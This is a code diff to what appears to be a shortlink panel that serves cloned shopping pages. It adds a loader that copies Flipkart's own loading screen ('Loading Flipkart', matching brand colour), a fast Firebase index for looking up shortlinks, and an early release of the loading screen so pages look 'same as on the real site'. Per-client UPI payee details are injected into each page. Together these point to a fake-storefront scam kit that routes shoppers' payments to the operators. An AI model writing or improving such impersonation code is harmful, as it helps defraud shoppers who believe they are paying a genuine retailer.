@@ -141,28 +141,21 @@ html.sp .site-frame{background:transparent}
 .sl .ab .dl{color:var(--danger);background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.25)}
 @media (prefers-reduced-motion:reduce){*{transition:none!important}}
 
-/* instant opening screen for shortlink pages: drawn from plain HTML/CSS, never waits for Firebase or scripts */
+/* instant opening screen for shortlink pages: exact copy of the site's own full-screen loader, drawn from plain HTML/CSS so it never waits for Firebase or scripts */
 #boot{display:none}
-html.sp #boot{display:block;position:fixed;inset:0;z-index:60;background:#f1f2f6;overflow:hidden;transition:opacity .18s}
+html.sp #boot{display:flex;align-items:center;justify-content:center;position:fixed;inset:0;z-index:60;background:#2772ee;transition:opacity .18s}
 #boot.off{opacity:0;pointer-events:none}
-#boot .bh{background:#2874f0;padding:calc(10px + env(safe-area-inset-top,0px)) 12px 12px}
-#boot .bt{display:flex;gap:8px;margin-bottom:10px}
-#boot .bt i{flex:1;height:34px;border-radius:8px;background:rgba(255,255,255,.95)}
-#boot .bs{height:40px;border-radius:8px;background:#fff}
-#boot .cats{display:flex;gap:14px;padding:12px;background:#fff;overflow:hidden}
-#boot .cats i{flex:none;width:52px;height:52px;border-radius:50%}
-#boot .bn{margin:10px 12px;height:150px;border-radius:12px}
-#boot .gr{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0 12px}
-#boot .gr i{height:210px;border-radius:10px}
-#boot .sk,#boot .cats i,#boot .bn,#boot .gr i{background:linear-gradient(90deg,#e4e7ee 25%,#f3f5f9 45%,#e4e7ee 65%);background-size:300% 100%;animation:bsh 1.2s linear infinite}
-#boot .gr i{background-color:#e4e7ee}
-@keyframes bsh{from{background-position:100% 0}to{background-position:0 0}}
-@media (prefers-reduced-motion:reduce){#boot .sk,#boot .cats i,#boot .bn,#boot .gr i{animation:none}}
+#boot span{color:#fff;font:700 17px/1 Inter,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;letter-spacing:.2px}
+#boot .dots i{opacity:.25;font-style:normal;animation:bdot 1.1s steps(1) infinite}
+#boot .dots i:nth-child(2){animation-delay:.3s}
+#boot .dots i:nth-child(3){animation-delay:.6s}
+@keyframes bdot{0%,20%{opacity:.25}50%{opacity:1}100%{opacity:.25}}
+@media (prefers-reduced-motion:reduce){#boot .dots i{animation:none;opacity:1}}
 </style>
 </head>
 <body>
-<script>if(/\bsp\b/.test(document.documentElement.className)){var _tc=document.querySelector('meta[name=theme-color]');if(_tc)_tc.content="#2874f0"}</script>
-<div id="boot" aria-hidden="true"><div class="bh"><div class="bt"><i></i><i></i></div><div class="bs"></div></div><div class="cats"><i class="sk"></i><i class="sk"></i><i class="sk"></i><i class="sk"></i><i class="sk"></i><i class="sk"></i></div><div class="bn sk"></div><div class="gr"><i></i><i></i><i></i><i></i></div></div>
+<script>if(/\bsp\b/.test(document.documentElement.className)){var _tc=document.querySelector('meta[name=theme-color]');if(_tc)_tc.content="#2772ee"}</script>
+<div id="boot" aria-hidden="true"><span>Loading Flipkart<span class="dots"><i>.</i><i>.</i><i>.</i></span></span></div>
 <div id="app"></div>
 <dialog id="dlg"></dialog>
 <div class="toast" id="toast" role="status"></div>
@@ -226,7 +219,21 @@ function pullSite(slug,cb){
       db.scripts=[sc];cachePut(slug,c,sc);return true;
     });
   }
-  /* Fast first-visit path: ask Firebase only for clients whose links[i] equals this slug.
+  /* Fastest path: a flat slug -> client-key index written whenever a shortlink is made (idxPut below).
+     One direct GET instead of scanning, so first-time opens on slow mobile connections settle in one round trip. */
+  function indexLookup(){
+    return tfetch(BASE+"/linkIndex/"+encodeURIComponent(slug)+".json",2500).then(function(cid){
+      if(!cid||typeof cid!=="string")return null;
+      return tfetch(BASE+"/clients/"+cid+".json",3500).then(function(c){
+        if(!c||typeof c!=="object")return null;
+        c.links=arr(c.links);
+        if(c.links.indexOf(slug)===-1)return null;   /* index stale (link edited/removed elsewhere): fall through */
+        return c;
+      }).catch(function(){return null});
+    }).catch(function(){return null});
+  }
+  /* Fallback first-visit path: ask Firebase only for clients whose links[i] equals this slug.
+     Used only for links made before the index existed, or if the index lookup above misses.
      This avoids downloading the whole clients collection on every public page open. */
   function findClientFast(){
     var jobs=[];
@@ -262,9 +269,13 @@ function pullSite(slug,cb){
       });
     });
   }
-  findClientFast().then(function(c){
-    if(!c)return legacyLookup();
-    return getClientScript(c).catch(function(){return legacyLookup()});
+  indexLookup().then(function(c){
+    if(c)return getClientScript(c).catch(function(){return legacyLookup()});
+    return findClientFast().then(function(c2){
+      if(!c2)return legacyLookup();
+      idxPut(slug,c2.id);   /* backfill: link existed before the index did, so later visits get the fast path too */
+      return getClientScript(c2).catch(function(){return legacyLookup()});
+    });
   }).then(function(ok){if(ok)done(true);else useCache(LOADERR||"page loading failed")})
     .catch(function(e){legacyLookup().then(function(ok){if(ok)done(true);else useCache(String(e&&e.message||e))}).catch(function(x){useCache(String(x&&x.message||e&&e.message||e))})});
 }
@@ -272,6 +283,10 @@ var touched=null;
 function bootOff(){var b=document.getElementById("boot");if(!b||b.className==="off")return;b.className="off";setTimeout(function(){if(b.parentNode)b.parentNode.removeChild(b)},250)}
 try{new MutationObserver(function(){if(document.querySelector("#app .site-msg"))bootOff()}).observe(document.getElementById("app"),{childList:true,subtree:true})}catch(e){}
 setTimeout(bootOff,15000);
+/* Keeps /linkIndex/<slug> in step with a client's links, so the very first open of a new shortlink
+   is a single direct lookup instead of scanning. Fire-and-forget: if it fails, the slower scan path still works. */
+function idxPut(slug,cid){try{fetch(BASE+"/linkIndex/"+encodeURIComponent(slug)+".json",{method:"PUT",body:JSON.stringify(ck(cid))})}catch(e){}}
+function idxDel(slug){try{fetch(BASE+"/linkIndex/"+encodeURIComponent(slug)+".json",{method:"DELETE"})}catch(e){}}
 function save(cb){
   if(!touched){if(cb)cb(false);return}
   var p={};["upi","pn","tr","pass","scriptId","visitors","links","meta"].forEach(function(k){p[k]=touched[k]===undefined?null:touched[k]});
@@ -571,7 +586,7 @@ var currentHash="";
 function loadSnap(slug,h){try{var o=JSON.parse(localStorage.getItem("shopsnap2-"+slug)||"null");if(o&&o.h===h&&Date.now()-o.t<1800000)return o.s}catch(e){}return null}
 function pruneSnaps(keep){try{for(var i=localStorage.length-1;i>=0;i--){var k=localStorage.key(i);if(k&&k.indexOf("shopsnap2-")===0&&k!==keep)localStorage.removeItem(k)}}catch(e){}}
 function saveSnap(slug,s,h){var key="shopsnap2-"+slug,v=JSON.stringify({t:Date.now(),h:h,s:s});try{localStorage.setItem(key,v)}catch(e){pruneSnaps(key);try{localStorage.setItem(key,v)}catch(x){}}}
-window.addEventListener("message",function(e){var f=$("#siteFrame");if(!f||e.source!==f.contentWindow)return;var d=e.data;if(d&&d.__ag&&!d.kid&&d.snap&&currentView==="site"&&currentSlug)saveSnap(currentSlug,d.snap,currentHash)});
+window.addEventListener("message",function(e){var f=$("#siteFrame");if(!f||e.source!==f.contentWindow)return;var d=e.data;if(!d)return;if(d.__bootDone){bootOff();return}if(d.__ag&&!d.kid&&d.snap&&currentView==="site"&&currentSlug)saveSnap(currentSlug,d.snap,currentHash)});
 
 /* ---------- public site ---------- */
 function renderSite(slug){
@@ -589,7 +604,9 @@ function renderSite(slug){
   var html=personalize(s,c);
   currentHash=s.id+"/"+hashStr(s.html||"")+"/"+hashStr([c.upi||"",c.pn||"",c.tr||""].join("|")+"|"+(c.pn||"").length);   /* a saved place only belongs to this exact script */
   var data=JSON.stringify({upi:c.upi||"",pn:c.pn||"",tr:c.tr||"",dbg:/[?&]debug/i.test(location.search+location.hash)?1:0}).replace(/</g,"\\u003c");
-  var inject='<script>window.PANEL='+data+';<\/script>'+agentTag(loadSnap(slug,currentHash));
+  /* releases the loading screen as soon as the page's structure exists, instead of waiting for every image \u2014 so the banner appears first and the rest of the layout fills in after it, same as on the real site */
+  var earlyOut='<script>document.addEventListener("DOMContentLoaded",function(){try{parent.postMessage({__bootDone:1},"*")}catch(e){}});<\/script>';
+  var inject=earlyOut+'<script>window.PANEL='+data+';<\/script>'+agentTag(loadSnap(slug,currentHash));
   html=/<head[^>]*>/i.test(html)?html.replace(/<head[^>]*>/i,function(m){return m+inject}):inject+html;
   var _sf=$("#siteFrame");
   if(!_sf){
@@ -740,7 +757,7 @@ function renderLinks(){
       if(!confirm("Delete this shortlink?"))return;
       var s=b.dataset.d;c.links=c.links.filter(function(x){return x!==s});delete c.meta[s];
       if(editing===s){editing=null;$("#mk").textContent="Create shortlink"}
-      touched=c;save();draw();toast("Shortlink deleted")
+      touched=c;save();idxDel(s);draw();toast("Shortlink deleted")
     }});
   }
   $("#mk").onclick=function(){
@@ -758,7 +775,7 @@ function renderLinks(){
     slugTakenRemote(s,function(taken,ok){
       if(!ok){e.textContent="Cannot reach the server. Try again.";return}
       if(taken){e.textContent="Try again";return}
-      e.textContent="";c.links.push(s);c.meta[s]={d:d,t:t};touched=c;save();
+      e.textContent="";c.links.push(s);c.meta[s]={d:d,t:t};touched=c;save();idxPut(s,c.id);
       $("#sd").value="";$("#st").value="";draw();toast("Shortlink created")
     });
   };
